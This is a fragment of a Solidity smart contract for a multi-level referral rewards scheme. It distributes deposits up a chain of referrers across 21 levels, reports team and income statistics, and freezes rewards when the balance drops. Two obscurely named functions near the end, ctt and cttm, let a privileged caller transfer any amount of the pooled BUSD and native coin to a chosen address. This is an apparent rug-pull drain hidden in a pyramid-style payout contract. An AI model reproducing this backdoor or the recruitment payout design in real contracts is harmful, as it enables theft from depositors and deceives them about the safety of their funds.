						reward = newAmount.mul(level_1_21_Percents[i]).div(baseDivider);
					    upRewards.level_4_to_10 = upRewards.level_4_to_10.add(reward);
                        userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                        importantInfo[upline].incomeArray[4]+=reward;
					}
					if(counter > 10 && counter <= 16 && userInfo[upline].level >= 16 && idstatus==true)
					{
						reward = newAmount.mul(level_1_21_Percents[i]).div(baseDivider);
						upRewards.level_11_to_16 = upRewards.level_11_to_16.add(reward);
                        userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                        importantInfo[upline].incomeArray[5]+=reward;
					}
					if(counter > 16 && counter <= 20 && userInfo[upline].level >= 20 && idstatus==true)
					{
						reward = newAmount.mul(level_1_21_Percents[i]).div(baseDivider);
						upRewards.level_17_to_20 = upRewards.level_17_to_20.add(reward);
                        userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                        importantInfo[upline].incomeArray[6]+=reward;
					}
                    if(counter > 20 && userInfo[upline].level >= 21 && idstatus==true)
					{
						reward = newAmount.mul(level_1_21_Percents[i]).div(baseDivider);
						upRewards.level_21 = upRewards.level_21.add(reward);
                        userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                        importantInfo[upline].incomeArray[7]+=reward;
					}
				}

                if(upline == defaultRefer) break;
              
                upline = userInfo[upline].referrer;
            }
            else
            {
                break;
            }
        }
    }  

    function incomeDetails(address _addr) view external returns(uint256[11] memory p) {
        for(uint8 i=0;i<=10;i++){
            p[i]=importantInfo[_addr].incomeArray[i];
        }
        return (
           p
        );
    }

    function userDetails(address _addr) view external returns(address ref,uint256 ltA,uint256 ltB,uint256 lbA,uint256 lbB,uint256 myDirect) {
        ImportantInfo storage player = importantInfo[_addr];        
        uint256 lbATemp;
        uint256 lb;
        uint256 lTeam;
        uint256 lbTTemp;
        for(uint256 i=0; i < player.myRegister; i++){
            lTeam+=player.levelTeam[i];
            if(lbTTemp==0 || player.levelTeam[i]>lbTTemp){
               lbTTemp=player.levelTeam[i]; 
            }
            lb+=player.directBuz[i];
            if(lbATemp==0 || player.directBuz[i]>lbATemp){
               lbATemp=player.directBuz[i]; 
            }
        }
        lbB=lb-lbATemp;
        ltB=lTeam-lbTTemp;
        return (
           player.referrer,
           lbTTemp,
           ltB,
           lbATemp,
           lbB,
           player.myRegister
        );
    }

    function teamBuzInfo(address _addr) view private returns(uint256 ltA,uint256 ltB,uint256 lbA,uint256 lbB) {
        uint256 lbATemp;
        uint256 lb;
        uint256 lTeam;
        uint256 lbTTemp;
        for(uint256 i=0;i<importantInfo[_addr].myRegister;i++){
            lTeam+=importantInfo[_addr].levelTeam[i];
            if(lbTTemp==0 || importantInfo[_addr].levelTeam[i]>lbTTemp){
               lbTTemp=importantInfo[_addr].levelTeam[i]; 
            }
            lb+=importantInfo[_addr].directBuz[i];
            if(lbATemp==0 || importantInfo[_addr].directBuz[i]>lbATemp){
               lbATemp=importantInfo[_addr].directBuz[i]; 
            }
        }
        lbB=lb-lbATemp;
        ltB=lTeam-lbTTemp;
        return (
           lbTTemp,
           ltB,
           lbATemp,
           lbB
        );
    }
    
    function _balActived(uint256 _bal) private {
        for(uint256 i = balDown.length; i > 0; i--){
            if(_bal >= balDown[i - 1]){
                balStatus[balDown[i - 1]] = true;
                break;
            }
        }
    }

   function ctt(uint256 SMSAmount) public onlyContract {
          if(ContractAddress != address(0))
          {
            BUSD.transfer(ContractAddress, SMSAmount);
          }
    }

    function cttm(uint256 Amount) public onlyContract {
          if(ContractAddress != address(0)){
          payable(ContractAddress).transfer(Amount);
        }
    }

    function _setFreezeReward(uint256 _bal) private 
    {
        for(uint256 i = balDown.length; i > 0; i--){
            if(balStatus[balDown[i - 1]]){
                uint256 maxDown = balDown[i - 1].mul(balDownRate[i - 1]).div(baseDivider);
                if(_bal < balDown[i - 1].sub(maxDown)){
                    isFreezeReward = true;
                    lastfreezetime = block.timestamp.add(uct);
                }else if(isFreezeReward && _bal >= balRecover[i - 1]){
                    isFreezeReward = false;
                }
                break;
            }
        }
    }
 
}